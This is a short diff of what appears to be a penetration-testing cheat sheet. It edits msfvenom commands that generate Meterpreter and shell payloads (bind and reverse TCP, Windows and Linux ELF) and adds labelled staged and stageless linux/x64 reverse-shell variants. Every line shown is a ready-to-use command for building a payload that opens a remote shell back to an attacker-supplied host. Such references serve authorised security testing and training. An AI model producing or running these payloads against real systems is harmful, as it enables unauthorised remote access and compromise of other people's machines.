@@ -31,7 +31,8 @@ msfvenom -p windows/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f
 
 ```bash
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f elf > reverse.elf
-msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf #stageless
+msfvenom -p linux/x64/shell/reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf # staged
 ```
 
 ### Bind Shell
